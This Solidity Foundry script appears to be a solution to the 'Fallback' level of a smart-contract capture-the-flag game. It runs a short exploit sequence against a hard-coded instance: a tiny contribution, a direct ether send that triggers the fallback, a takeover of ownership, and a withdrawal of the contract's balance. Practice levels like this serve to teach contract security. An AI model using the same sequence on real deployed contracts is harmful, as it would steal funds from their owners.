// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../levels/level01.sol";
import "forge-std/console.sol";

contract MyScript is Script {
   
    Fallback public fallbackInstance = Fallback(payable(0x1e6232D3A37B4C003Aa5308bCC873afDA95b63ce));
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        fallbackInstance.contribute{value: 1 wei}(); // contribute some Ether/Wei
        fallbackInstance.getContribution(); // check how much my contribution is
        address(fallbackInstance).call{value: 1 wei}(""); // trigger the fallback function
        fallbackInstance.owner(); // query new owner
        fallbackInstance.withdraw(); 

        vm.stopBroadcast();
    }
}